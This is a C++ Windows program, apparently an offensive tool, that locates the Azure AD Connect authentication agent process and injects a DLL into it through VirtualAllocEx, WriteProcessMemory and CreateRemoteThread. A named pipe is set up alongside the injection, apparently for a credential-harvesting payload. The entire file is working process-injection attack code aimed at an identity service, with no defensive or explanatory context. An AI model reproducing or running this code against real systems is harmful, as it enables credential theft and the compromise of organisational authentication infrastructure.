#include <Windows.h> 
#include <TlHelp32.h> 
#include <iostream> 
#include <tchar.h> 
#include <stdlib.h> 
#include <string> 
 
DWORD GetProcess() { 
 DWORD id = 0; 
 
 HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 
 
 if (hSnapshot != INVALID_HANDLE_VALUE) { 
  PROCESSENTRY32 pe32; 
  pe32.dwSize = sizeof(pe32); 
 
  do { 
 
   if (_wcsicmp(pe32.szExeFile, L"AzureADConnectAuthenticationAgentService.exe") == 0) { 
    _tprintf(TEXT("\nProcessName: %s"), pe32.szExeFile); 
    _tprintf(TEXT("\nProcessID: %lu\n"), pe32.th32ProcessID); 
    id = pe32.th32ProcessID; 
    break; 
   } 
 
  } while (Process32Next(hSnapshot, &pe32)); 
 
  CloseHandle(hSnapshot); 
  return id; 
 } 
} 
 
 
BOOL InjectDLL(DWORD procID) { 
 const char* dllPath = "C:\\ptadll.dll"; 
 void* loadlibaddress = NULL; 
 void* inject = NULL; 
 
 //open handle to process 
 HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID); 
 if (hProc) { 
  std::cout << "handle open to proc\n"; 
   
  loadlibaddress = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA"); 
  std::cout << "load library fetched\n"; 
 
  inject = VirtualAllocEx(hProc, 0x00, strlen(dllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); 
  std::cout << "mem allocated\n"; 
  
  if (WriteProcessMemory(hProc, inject, dllPath, strlen(dllPath) + 1, 0)) { 
   std::cout << "mem written\n"; 
  } 
  else { 
   throw std::runtime_error("writeprocmemoery failes"); 
  } 
 } 
 
 HANDLE hThread = CreateRemoteThread(hProc, NULL, 0x00, (LPTHREAD_START_ROUTINE)loadlibaddress, inject, NULL, NULL); 
 std::cout << "thread created \n"; 
  
 WaitForSingleObject(hThread, INFINITE); 
 VirtualFreeEx(hProc, loadlibaddress, strlen(dllPath) + 1, MEM_RELEASE); 
 return TRUE; 
} 
 
int main() { 
 DWORD procID = 0; 
 std::cout << "Creating the named pipe..."; 
 HANDLE pipe = CreateNamedPipe( 
  L"\\\\.\\pipe\\azureadpipe", 
  PIPE_ACCESS_DUPLEX, 
  PIPE_TYPE_BYTE, 
  1, 
  0, 
  0, 
  1000, 
  NULL 
 ); 
 
 if (pipe == NULL || pipe == INVALID_HANDLE_VALUE) { 
  std::cout << "Failed to create the pipe"; 
  system("pause"); 
  return 1; 
 } 
 std::cout << "Waiting for connection to the pipe"; 
 
 while (!procID){ 
  procID = GetProcess(); 
  InjectDLL(procID); 
  BOOL result = ConnectNamedPipe(pipe, NULL); 
  Sleep(30); 
 } 
 
 system("pause"); 
}